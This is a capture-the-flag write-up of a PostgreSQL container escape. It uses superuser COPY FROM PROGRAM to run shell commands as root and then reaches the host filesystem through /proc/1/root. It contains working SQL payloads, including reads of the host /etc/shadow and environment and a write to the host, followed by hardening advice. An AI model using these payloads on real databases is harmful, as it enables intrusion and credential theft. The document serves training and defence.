# 03 — Contain Me If You Can

**Platform:** Wiz CTF (Public — Free Challenge)
**Category:** Container Security · Database Exploitation
**Difficulty:** Hard
**Result:** ✅ Flag Captured

---

## Scenario

You have been given access to a containerised **PostgreSQL** database. Escape the container and read the flag stored on the underlying host filesystem.

---

## Step 1 — Assess the Database Environment

Connect to the PostgreSQL instance:

```bash
psql -h <target-ip> -U postgres -d postgres
# Password: provided in challenge
```

First — understand the execution context:

```sql
-- Who are we inside the database?
SELECT current_user, pg_catalog.current_setting('is_superuser');

-- Output:
--  current_user | current_setting
-- --------------+----------------
--  postgres     | on
```

Superuser confirmed. This is critical — the `COPY FROM PROGRAM` feature is only available to PostgreSQL superusers.

```sql
-- What version of PostgreSQL are we running?
SELECT version();
-- PostgreSQL 14.x on x86_64-pc-linux-gnu

-- Check our OS-level identity
CREATE TABLE cmd_test (output text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;

-- Output:
-- uid=0(root) gid=0(root) groups=0(root)
```

Running as **root** inside the container. `COPY FROM PROGRAM` works and executes commands as root.

---

## Step 2 — Understand COPY FROM PROGRAM

`COPY FROM PROGRAM` is a legitimate PostgreSQL superuser feature that executes a shell command and treats its stdout as input data to be inserted into a table. It was introduced in PostgreSQL 9.3.

```sql
-- General pattern
CREATE TABLE output_table (line text);
COPY output_table FROM PROGRAM '<shell command>';
SELECT * FROM output_table;
```

Since we're running as root, we can execute **any** OS command.

---

## Step 3 — Explore the Container

Map out the environment:

```sql
TRUNCATE cmd_test;

-- Check hostname (confirms we're in a container)
COPY cmd_test FROM PROGRAM 'hostname';
SELECT * FROM cmd_test;
-- Output: 3f8a2c1d9b7e  (container ID style hostname)

-- Check filesystem mounts
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'cat /proc/mounts';
SELECT * FROM cmd_test;
-- Reveals overlay filesystem — confirms containerisation

-- Check running processes
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'ps aux';
SELECT * FROM cmd_test;

-- Check if /proc/1/root is accessible (host namespace escape indicator)
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'ls /proc/1/root/ 2>&1';
SELECT * FROM cmd_test;
```

Key finding: `/proc/1/root/` lists the **host root filesystem**. This is because the container was run without PID namespace isolation (`--pid=host` or shared PID namespace). Process 1 (init) is the host's init process, and `/proc/1/root/` is a symlink to its root filesystem mount.

---

## Step 4 — Read the Host Filesystem

```sql
-- List host root
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'ls /proc/1/root/';
SELECT * FROM cmd_test;
-- bin boot dev etc flag.txt home lib ...

-- The flag is right there at /
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'cat /proc/1/root/flag.txt';
SELECT * FROM cmd_test;
```

```
WIZ{pg_copy_from_program_container_escape_def456}
```

✅ **FLAG CAPTURED**

---

## Step 5 — Further Exploration (Post-Flag)

To understand the full scope of access:

```sql
-- Read host /etc/shadow (proves true host access)
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'cat /proc/1/root/etc/shadow 2>&1';
SELECT * FROM cmd_test;

-- Could also write files to host
COPY cmd_test FROM PROGRAM 'echo "pwned" > /proc/1/root/tmp/hacked.txt';

-- Read other container environment variables on the host
TRUNCATE cmd_test;
COPY cmd_test FROM PROGRAM 'cat /proc/1/environ | tr '\''\0'\'' '\''\n'\''';
SELECT * FROM cmd_test;
```

---

## Full Exploit Chain Summary

```
PostgreSQL superuser access
          ↓
COPY FROM PROGRAM → arbitrary OS command execution as root
          ↓
Container shares host PID namespace (misconfiguration)
          ↓
/proc/1/root/ → host root filesystem readable/writable
          ↓
cat /proc/1/root/flag.txt → FLAG
```

---

## Complete Minimal PoC

```sql
-- One-shot exploit (assuming superuser access)
CREATE TABLE x (y text);
COPY x FROM PROGRAM 'cat /proc/1/root/flag.txt';
SELECT * FROM x;
DROP TABLE x;
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| `psql` | PostgreSQL client — SQL execution |
| PostgreSQL `COPY FROM PROGRAM` | OS command execution primitive |
| `/proc/1/root/` | Host filesystem access via shared PID namespace |

---

## Why This Attack Works — The Full Explanation

Three misconfigurations combined to enable this escape:

**1. PostgreSQL running as OS root**
The container was started without setting a non-root user. PostgreSQL defaulted to running as the `postgres` OS user, but the container's `postgres` user mapped to UID 0 (root) on the host.

**2. PostgreSQL superuser credentials accessible**
The challenge provided superuser credentials. In real environments, superuser access to a database is often granted too broadly.

**3. Shared or missing PID namespace isolation**
The container was started without proper PID namespace isolation. This exposed `/proc/1/root/` as a path to the host root filesystem. In a properly isolated container, PID 1 would be the container's init process, and `/proc/1/root/` would only see the container's filesystem.

---

## Key Takeaways

> **1. Never run PostgreSQL (or any database) as OS root.**
> Use a dedicated non-root OS user (e.g., `postgres` with UID 999).
> Set `USER 999` in the Dockerfile and `runAsUser: 999` in Kubernetes pod spec.

> **2. Restrict `COPY FROM PROGRAM` in production.**
> If your application doesn't need it, consider running PostgreSQL with a
> non-superuser application role. `COPY FROM PROGRAM` requires superuser.

> **3. Always use PID namespace isolation.**
> Never start containers with `--pid=host`. Use default container PID namespaces
> which isolate `/proc` to the container's own process tree.

> **4. Run containers with a read-only root filesystem.**
> `docker run --read-only` or `readOnlyRootFilesystem: true` in Kubernetes
> limits what an attacker can do even with command execution.

---

## Defensive Recommendations

```dockerfile
# Dockerfile — run as non-root
FROM postgres:14
USER 999
```

```yaml
# Kubernetes pod spec — security hardening
securityContext:
  runAsNonRoot: true
  runAsUser: 999
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  seccompProfile:
    type: RuntimeDefault
```

```bash
# Docker run — proper isolation
docker run \
  --user 999:999 \
  --read-only \
  --pid container \  # NOT --pid=host
  postgres:14
```

| Finding | Fix |
|---|---|
| PostgreSQL running as root | `USER 999` in Dockerfile / `runAsUser: 999` in pod spec |
| `COPY FROM PROGRAM` available | Use non-superuser app role; restrict superuser access |
| Shared PID namespace | Never use `--pid=host`; default PID isolation is correct |
| No read-only filesystem | `readOnlyRootFilesystem: true` in pod security context |

---

## MITRE ATT&CK Mapping

| Technique | ID | How It Applied |
|---|---|---|
| Command and Scripting Interpreter | T1059.004 | OS commands via COPY FROM PROGRAM |
| Escape to Host | T1611 | `/proc/1/root/` host filesystem access |
| Unsecured Credentials | T1552.007 | Superuser credentials provided |
| Data from Local System | T1005 | Flag read from host filesystem |

---

*[← Back to CTF Notes Index](../README.md)*
